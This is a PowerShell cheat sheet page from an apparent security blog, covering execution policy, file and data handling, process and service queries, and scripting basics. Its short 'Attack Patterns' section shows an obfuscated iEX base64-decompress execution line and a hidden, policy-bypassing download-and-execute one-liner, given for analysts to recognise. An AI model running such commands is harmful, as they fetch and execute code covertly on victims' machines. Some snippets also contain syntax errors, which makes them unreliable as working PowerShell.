<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üìò Powershell BTFM - Analyst</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="icon" href="https://bakerst221b.com/favicon.png">
  <link href="/css/style-classic.css"></link>
  
  
  <link rel="stylesheet" href="/css/style.min.0fd8269b84d57bc40ce18bb200a70ca7e1001ccf31f98dc3a8e47fa25f99b326.css">
  

  

</head>

<body class='page page-default-single'>
  <div id="main-menu-mobile" class="main-menu-mobile">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-ttp üîç">
      <a href="/docs/ttp">
        <span>TTP üîç</span>
      </a>
    </li>
    
    <li class="menu-item-artefacts db üè∫">
      <a href="/docs/artefacts">
        <span>Artefacts DB üè∫</span>
      </a>
    </li>
    
    <li class="menu-item-attacks db ‚öîÔ∏è">
      <a href="/docs/attacks">
        <span>Attacks DB ‚öîÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tools db üõ†Ô∏è">
      <a href="/docs/tools">
        <span>Tools DB üõ†Ô∏è</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
  </ul>
</div>
  <div class="wrapper">
    <div class='header'>
  <div class="container">
    <div class="logo">
      <a href="https://bakerst221b.com/"><img alt="Logo" src="/images/logo.png" /></a>
    </div>
    <div class="logo-mobile">
      <a href="https://bakerst221b.com/"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
    </div>
    

    <div id="main-menu" class="main-menu">
  <ul>
    
    
    <li class="menu-item-home üè°">
      <a href="/">
        <span>Home üè°</span>
      </a>
    </li>
    
    <li class="menu-item-blog ‚úçÔ∏è">
      <a href="/docs/blog">
        <span>Blog ‚úçÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-ttp üîç">
      <a href="/docs/ttp">
        <span>TTP üîç</span>
      </a>
    </li>
    
    <li class="menu-item-artefacts db üè∫">
      <a href="/docs/artefacts">
        <span>Artefacts DB üè∫</span>
      </a>
    </li>
    
    <li class="menu-item-attacks db ‚öîÔ∏è">
      <a href="/docs/attacks">
        <span>Attacks DB ‚öîÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-tools db üõ†Ô∏è">
      <a href="/docs/tools">
        <span>Tools DB üõ†Ô∏è</span>
      </a>
    </li>
    
    <li class="menu-item-crypto üóùÔ∏è">
      <a href="/docs/cryptography">
        <span>Crypto üóùÔ∏è</span>
      </a>
    </li>
    
    <li class="menu-item-about me üßùüèΩ‚Äç‚ôÄÔ∏è">
      <a href="/docs/about">
        <span>About me üßùüèΩ‚Äç‚ôÄÔ∏è</span>
      </a>
    </li>
    
  </ul>
</div>
    
    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
  <span class="hamburger-box">
    <span class="hamburger-inner"></span>
  </span>
</button>
    
    <div style="margin-left: 20pt;">
      <a href="/index.xml" type="application/rss+xml">
        <img src="/images/rss.png" alt="RSS Feed">
      </a>
    </div>
    
    <style>
      a[href="/index.xml"] {
        display: inline-block;
        vertical-align: middle;
        margin-right: 10px;
      }
    
      a[href="/index.xml"] img {
        height: 30px;
      }
    </style>
    
  </div>
</div>


    
    
    
    
    
    

    
    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
      <div class="row">
        <div class="col-12 col-md-3 mb-3">
          <div class="sidebar">
            
<div class="docs-menu">
  <p>
   <a href="/docs/tools/field-manuals/"> üëàüèº Back to </br> üìò üìï Field Manuals </a>
  </p>
  <aside>
   <nav id="TableOfContents">
  <ul>
    <li><a href="#settings">Settings</a>
      <ul>
        <li><a href="#association">Association</a></li>
        <li><a href="#execution-policy">Execution Policy</a></li>
        <li><a href="#start-services">Start Services</a></li>
        <li><a href="#registry">Registry</a></li>
      </ul>
    </li>
    <li><a href="#fuc">FUC</a></li>
    <li><a href="#working-with-files">Working With Files</a>
      <ul>
        <li><a href="#csv">CSV</a></li>
        <li><a href="#xml">XML</a></li>
        <li><a href="#json">JSON</a></li>
      </ul>
    </li>
    <li><a href="#-btfm---useful-for-investigation">üìò BTFM - Useful For Investigation</a>
      <ul>
        <li><a href="#services">Services</a></li>
        <li><a href="#processes">Processes</a></li>
        <li><a href="#files">Files</a></li>
        <li><a href="#decrypting">Decrypting</a></li>
      </ul>
    </li>
    <li><a href="#-rtfm---attack-patterns">üìï RTFM - Attack Patterns</a></li>
    <li><a href="#remote-connection">Remote connection</a>
      <ul>
        <li><a href="#dcom">DCOM</a></li>
        <li><a href="#wsman">WSMan</a></li>
      </ul>
    </li>
    <li><a href="#queries">Queries</a>
      <ul>
        <li><a href="#cim">CIM</a></li>
        <li><a href="#wmi">WMI</a></li>
      </ul>
    </li>
    <li><a href="#scripting">Scripting</a>
      <ul>
        <li><a href="#operators">Operators</a></li>
        <li><a href="#strings">Strings</a></li>
        <li><a href="#conditions">Conditions</a></li>
        <li><a href="#collections">Collections</a></li>
        <li><a href="#timestamps">Timestamps</a></li>
        <li><a href="#functions">Functions</a></li>
        <li><a href="#error-handling">Error Handling</a></li>
        <li><a href="#classes">Classes</a></li>
        <li><a href="#emails">Emails</a></li>
      </ul>
    </li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
 </aside>
</div>



          </div>
        </div>
        <div class="col-12 col-md-9">
          
<h1 class="title">üìò Powershell BTFM</h1>
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    <div class="meta">
      
      
      <div class="article-category">
          
            
              <i class="fab fa-windows"></i>          
            
            
            
            
            
            
          
          
      </div> <br />
      

      
      <div class="article-category">
        <i class="fas fa-tools"></i>
          
          
          <a class="platform-link" href="/tools/powershell">PowerShell</a> 
          
      </div> <br />
      
      

      
    </div>
    
    <b>Created:</b> 23.09.2020
    <br />

    

  </header>


  <div class="content" itemprop="articleBody">
    <h2 id="settings">Settings</h2>
<h3 id="association">Association</h3>
<p>It&rsquo;s better to associate powershell scripts with notepad.exe that PowerShell for security reasons.</p>
<h3 id="execution-policy">Execution Policy</h3>
<p><strong>Get Execution Policy</strong>. Powershell execution policy is applied to scripts only. Here are the main policies used:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ExecutionPolicy
</span></span><span style="display:flex;"><span>&gt; Restricted <span style="color:#75715e"># no scripts are allowed (default for desktop)</span>
</span></span><span style="display:flex;"><span>&gt; RemoteSigned <span style="color:#75715e"># downloaded scripts should be signed (preferred, default for WinServer). For local scripts no signature is required.</span>
</span></span><span style="display:flex;"><span>&gt; Unrestricted <span style="color:#75715e"># everything is allowed (dangerous)</span>
</span></span><span style="display:flex;"><span>&gt; Undefined <span style="color:#75715e"># Restricted for Win and RemoteSigned for WinServer</span>
</span></span><span style="display:flex;"><span>&gt; AllSigned <span style="color:#75715e"># Signatures are required for local scripts also</span>
</span></span><span style="display:flex;"><span>&gt; ByPass <span style="color:#75715e"># Nothing is blocked, no warnings and prompts</span>
</span></span></code></pre></div><p>Other policies, official doc [<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies">2</a>].</p>
<p><strong>Set Execution Policy</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
</span></span></code></pre></div><h3 id="start-services">Start Services</h3>
<h3 id="registry">Registry</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ChildItem HKLM<span style="color:#960050;background-color:#1e0010">:</span>Software | Format-Wide
</span></span></code></pre></div><h2 id="fuc">FUC</h2>
<p>Frequently Used Commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-Help -ShowWindows/-Online/-full <span style="color:#75715e"># withough any option - short help in the console itself</span>
</span></span></code></pre></div><h2 id="working-with-files">Working With Files</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Writing to file. </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Method 1</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Name, EmployeeID, Eligibility&#34;</span> &gt; employee_eligibility_status.csv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Method 2</span>
</span></span><span style="display:flex;"><span>$output_file = <span style="color:#e6db74">&#34;employee_eligibility_status.csv&#34;</span>
</span></span><span style="display:flex;"><span>Write-Output <span style="color:#e6db74">&#34;Name,EmployeeID,Eleigibility Status&#34;</span> | Out-File $output_file  [-Append] <span style="color:#75715e"># Append is optional, of course</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enum files in the dir, filter and do something with each one</span>
</span></span><span style="display:flex;"><span>Get-ChildItem -Path .\testfolder -Filter <span style="color:#e6db74">&#34;*.emp&#34;</span> | ForEach-Object {
</span></span><span style="display:flex;"><span> $emp = $_.BaseName <span style="color:#75715e"># get the filename</span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># do something</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Copy-Item -Path -Destination -Recurse
</span></span><span style="display:flex;"><span>Move-Item -Path -Destination -Recurse
</span></span><span style="display:flex;"><span>Remove-Item -Path -Recurse
</span></span><span style="display:flex;"><span>Rename-Item -Path -NewName
</span></span><span style="display:flex;"><span>Test-Path <span style="color:#e6db74">&#34;Path&#34;</span> <span style="color:#75715e"># check whether the file exists</span>
</span></span><span style="display:flex;"><span>Get-Content <span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#75715e"># read the file</span>
</span></span><span style="display:flex;"><span>Get-Content <span style="color:#e6db74">&#34;file&#34;</span> | Tail <span style="color:#ae81ff">-2</span> <span style="color:#75715e"># last 2 lines</span>
</span></span><span style="display:flex;"><span>Get-Content <span style="color:#e6db74">&#34;hugelogfile.txt&#34;</span> | Where-Object { $_ <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;*ERROR*&#34;</span>}
</span></span><span style="display:flex;"><span>Select-String <span style="color:#75715e"># +\- grep</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># removing files older than</span>
</span></span><span style="display:flex;"><span>$dir = <span style="color:#e6db74">&#34;C:\Windows\tmp&#34;</span>
</span></span><span style="display:flex;"><span>$retention = <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>Get-ChildItem <span style="color:#f92672">-File</span> -Recurse $dir | Where-Object {$_.LastWriteTime <span style="color:#f92672">-lt</span> (get-date).adddays(-$retention) | % {$_.fullname | del -Force }}
</span></span></code></pre></div><h3 id="csv">CSV</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Add-Content  uses .ToString() on the input</span>
</span></span><span style="display:flex;"><span>Add-Content -Path <span style="color:#e6db74">&#34;file.csv&#34;</span> -Value <span style="color:#e6db74">&#34;Name, Surname, Age&#34;</span>
</span></span><span style="display:flex;"><span>$students = @(
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#34;Alex&#34;, &#34;Zverev&#34;, &#34;30&#34;&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#34;Veronica&#34;, &#34;Zvereva&#34;, &#34;29&#34;&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#34;Johnny&#34;, &#34;Depp&#34;, &#34;50&#34;&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$students | <span style="color:#66d9ef">foreach</span> { Add-Content -Path <span style="color:#e6db74">&#34;file.csv&#34;</span> -Value $_ }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>$contents = Import-csv <span style="color:#e6db74">&#34;file.csv&#34;</span> | Sort-Object Age | Export-Csv <span style="color:#e6db74">&#34;sortedfile.csv&#34;</span>
</span></span></code></pre></div><h3 id="xml">XML</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">xml</span>]$content = Get-Content <span style="color:#e6db74">&#34;file.xml&#34;</span>
</span></span><span style="display:flex;"><span>$content.GetType()
</span></span><span style="display:flex;"><span>$content.MAIN_NODE.COMP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($entity <span style="color:#66d9ef">in</span> $content.GetElementsByTagName(<span style="color:#e6db74">&#34;COMP&#34;</span>)) {
</span></span><span style="display:flex;"><span>    Write-Output $entity.IP
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Process | Select-Object -First <span style="color:#ae81ff">2</span> | Export-Clixml output.xml
</span></span></code></pre></div><h3 id="json">JSON</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$json = Get-Content <span style="color:#e6db74">&#34;file.json&#34;</span> | Out-String | ConvertFrom-Json
</span></span></code></pre></div><h2 id="-btfm---useful-for-investigation">üìò BTFM - Useful For Investigation</h2>
<p>You can get the previously executed commands with <code>Get-History</code> cmdlet. However, what if the last command executed was <code>Clear-History</code>? That might be suspicious and a lead.</p>
<h3 id="services">Services</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-Service | Where-Object { $_.Name like <span style="color:#e6db74">&#39;*a*&#39;</span> } | Where-Object {$_.Status <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;Stopped&#39;</span> } | Select-Object -First <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Service | Where-Object { $_.Status <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;running&#39;</span> } | Select-Object -First <span style="color:#ae81ff">1</span> | Stop-Service -WhatIf <span style="color:#75715e"># Get services that are rinning, select the first one in the list and tell me what will be stopped if I run Stop-Service (but don&#39;t run it yet).</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Service | Group-Object -Property ServiceType
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Service | ConvertTo-Html -Property name, displayname, status
</span></span><span style="display:flex;"><span>ConvertTo-Csv
</span></span><span style="display:flex;"><span>ConvertTo-Json
</span></span><span style="display:flex;"><span>ConvertTo-Xml
</span></span></code></pre></div><h3 id="processes">Processes</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-Process | Out-GridView
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Process -Name <span style="color:#e6db74">&#34;*a*&#34;</span> | Select-Object -First <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>Get-Process | Get-Member
</span></span><span style="display:flex;"><span>Get-Process -Name <span style="color:#e6db74">&#34;*a*&#34;</span> | Select-Object -Property CPU
</span></span><span style="display:flex;"><span>Get-Process | Where-Object { $_.CPU <span style="color:#f92672">-ge</span> <span style="color:#ae81ff">1000</span> }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Process | Sort-Object cpu | Select-Object -First <span style="color:#ae81ff">10</span> <span style="color:#75715e"># get the process list, sort by CPU usage and display the first 10 processes</span>
</span></span><span style="display:flex;"><span>Get-Process -Name <span style="color:#e6db74">&#34;powershell*&#34;</span> | Select * <span style="color:#75715e"># display ALL info about the process</span>
</span></span><span style="display:flex;"><span>Get-Process | Where-Object { $_.cpu <span style="color:#f92672">-gt</span> <span style="color:#ae81ff">10</span> } | Out-File <span style="color:#e6db74">&#34;file.txt&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Process | Where-Object { $_.cpu <span style="color:#f92672">-gt</span> <span style="color:#ae81ff">10000</span> } | Sort-Object cpu | Select -First <span style="color:#ae81ff">1</span> | Stop-Process <span style="color:#75715e"># Stop the most cpu costy process</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-Process | Sort-Object BaseProperty | Group-Object -Property BaseProperty
</span></span><span style="display:flex;"><span>Get-Process | Sort-Object cpu -Descending | Select-Object -First <span style="color:#ae81ff">10</span> | Format-Table processname, id, cpu, pm
</span></span></code></pre></div><h3 id="files">Files</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># useful for a supernova</span>
</span></span><span style="display:flex;"><span>Get-ChildItem -Path <span style="color:#e6db74">&#34;C:\Windows&#34;</span> -Recurse | ConvertTo-Html -Property name,fullname -CssUril mycss.css | Out-File <span style="color:#e6db74">&#39;files_in_Windows.html&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$head=@<span style="color:#e6db74">&#34;Some css&#34;</span>@
</span></span><span style="display:flex;"><span>Get-ChildItem -Path <span style="color:#e6db74">&#34;C:\Windows&#34;</span> -Recurse | ConvertTo-Html -Property name,fullname -Head $head -Title <span style="color:#e6db74">&#34;Report&#34;</span>  | Out-File <span style="color:#e6db74">&#39;files_in_Windows.html&#39;</span>
</span></span></code></pre></div><h3 id="decrypting">Decrypting</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Write-Host = $whatever <span style="color:#75715e"># will output the value without invoking anything</span>
</span></span></code></pre></div><h2 id="-rtfm---attack-patterns">üìï RTFM - Attack Patterns</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>iEX(New-Object IO.Compression.DeflateStream[<span style="color:#66d9ef">IO.MemoryStream][System.Convert</span>]::FromBase64String(<span style="color:#e6db74">&#39;&#39;</span>),[<span style="color:#66d9ef">System.IO.Compression.CompressionMode</span>]::Decompress) | % {New-Object System.IO.StreamReader($_,[<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII)} | % {$_.readToEnd()})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>powershell -nopr -ep bypAss -w hiddEN -nonI -co <span style="color:#e6db74">&#39;(nEW-obJECt nEt.WebClIeNt).DoWnloADfile(‚Ä¶;iEX()....&#39;</span>
</span></span></code></pre></div><h2 id="remote-connection">Remote connection</h2>
<p>See what connections are open and what protocols they are using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-CimSession
</span></span></code></pre></div><h3 id="dcom">DCOM</h3>
<h3 id="wsman">WSMan</h3>
<h2 id="queries">Queries</h2>
<h3 id="cim">CIM</h3>
<h3 id="wmi">WMI</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-WmiObject -Namespace <span style="color:#e6db74">&#39;root\cimv2&#39;</span> -List | Out-GridView
</span></span></code></pre></div><h2 id="scripting">Scripting</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$localvar.GetType()
</span></span><span style="display:flex;"><span>$global:var <span style="color:#75715e"># accessible not only from the script, Get-Variable will show it. But open another shell - it won&#39;t be there.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Set-Variable -Constant - ReadOnly <span style="color:#75715e"># check if exists and change if it does</span>
</span></span><span style="display:flex;"><span>New-Variable
</span></span><span style="display:flex;"><span>Clear-Variable
</span></span><span style="display:flex;"><span>Remove-Variable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$var -s [<span style="color:#66d9ef">int</span>] <span style="color:#75715e"># check if int</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">int</span>]$var = <span style="color:#ae81ff">100</span> <span style="color:#75715e"># force the variable $var to ALWAYS be of int type</span>
</span></span><span style="display:flex;"><span>$var = [<span style="color:#66d9ef">int</span>]<span style="color:#ae81ff">100</span> <span style="color:#75715e"># apply on var to ensure that the data for this user input is correct</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">string</span>]$answer = Read-Host <span style="color:#e6db74">&#34;Question?&#34;</span> -AsSecureString <span style="color:#75715e"># get user input, convert to string -AsSecureString will not show the contents of the $answer</span>
</span></span><span style="display:flex;"><span>[validateset(<span style="color:#e6db74">&#34;y&#34;</span>,<span style="color:#e6db74">&#34;Y&#34;</span>, <span style="color:#e6db74">&#34;n&#34;</span>, <span style="color:#e6db74">&#34;N&#34;</span>)]$answer = Read-Host <span style="color:#e6db74">&#34;Are you ok? (y/n)&#34;</span>
</span></span><span style="display:flex;"><span>[validatelength(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">120</span>)]$answer = Read-Host <span style="color:#e6db74">&#34;What&#39;s your name?&#34;</span>
</span></span><span style="display:flex;"><span>[validaterange(<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">120</span>)]$answer = Read-Host <span style="color:#e6db74">&#34;How old are you?&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get more with Get-Help about_Functions_advanced_Parameters -ShowWindow</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Write-Host -ForegroundColor -BackgroundColor <span style="color:#75715e"># doesn&#39;t return an object, so you CAN&#39;T PIPE the result!!!!</span>
</span></span><span style="display:flex;"><span>Write-Output <span style="color:#75715e"># outputs something but also CAN be piped to another command</span>
</span></span><span style="display:flex;"><span>Write-Error
</span></span><span style="display:flex;"><span>Write-Warning
</span></span><span style="display:flex;"><span>Write-Debug -Debug
</span></span><span style="display:flex;"><span>Write-Verbose -Verbose
</span></span></code></pre></div><blockquote>
<p>‚ö†Ô∏è Double quotes resolve to variale value, while single quotes - don&rsquo;t. To override this behaviour of double quotes <code>&quot;&quot;</code>, use a ``` sign.</p></blockquote>
<h3 id="operators">Operators</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># resemble Hugo&#39;s syntax, but the operator is placed between the operands.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># also resembles assembly</span>
</span></span><span style="display:flex;"><span>eq 
</span></span><span style="display:flex;"><span>ceq <span style="color:#75715e"># case-sensitive operator</span>
</span></span><span style="display:flex;"><span>neq
</span></span><span style="display:flex;"><span>lt, gt. le, ge
</span></span><span style="display:flex;"><span>like <span style="color:#75715e"># contains</span>
</span></span><span style="display:flex;"><span>clike <span style="color:#75715e"># case-senstive contains</span>
</span></span><span style="display:flex;"><span>notlike
</span></span><span style="display:flex;"><span>match <span style="color:#75715e"># use regex</span>
</span></span><span style="display:flex;"><span>contains <span style="color:#75715e"># return True or False</span>
</span></span></code></pre></div><p>Example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>@(THis is a big text to search some keywords <span style="color:#66d9ef">in</span>) <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;text&#34;</span>
</span></span></code></pre></div><h3 id="strings">Strings</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>string.IndexOf(<span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>string.Trim()
</span></span><span style="display:flex;"><span>string.ToUpper()
</span></span><span style="display:flex;"><span>string.Replace(<span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;b&#34;</span>)
</span></span><span style="display:flex;"><span>string.Contains()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>string.GetMember() <span style="color:#75715e"># print all available operations for strings</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$this_is_a_multiline = @<span style="color:#e6db74">&#34;Hello
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">world, I have a question: &#34;</span>How
</span></span><span style="display:flex;"><span>are you<span style="color:#e6db74">&#34;?&#34;</span>@
</span></span></code></pre></div><h3 id="conditions">Conditions</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">-not</span> ($n <span style="color:#f92672">-le</span> $n2)) {
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Good&#34;</span>
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Happy snowman!&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">1</span> = <span style="color:#ae81ff">1</span>) <span style="color:#f92672">-and</span> (<span style="color:#ae81ff">2</span> = <span style="color:#ae81ff">2</span>){
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;Math is not broken!&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;The Universe seems to be exploding&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span>($num)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">1</span> {<span style="color:#e6db74">&#34;Good&#34;</span>}
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span> {<span style="color:#e6db74">&#34;Hm&#34;</span>}
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">3</span> {<span style="color:#e6db74">&#34;Hmhm&#34;</span>}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">default</span> (<span style="color:#e6db74">&#34;Happy snowman&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="collections">Collections</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># array list</span>
</span></span><span style="display:flex;"><span>$array = @(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">4</span>) <span style="color:#75715e"># IsFixedSize</span>
</span></span><span style="display:flex;"><span>$array[<span style="color:#ae81ff">1</span>.<span style="color:#ae81ff">.2</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># list</span>
</span></span><span style="display:flex;"><span>$list = New-Object System.Collections.ArrayList
</span></span><span style="display:flex;"><span>
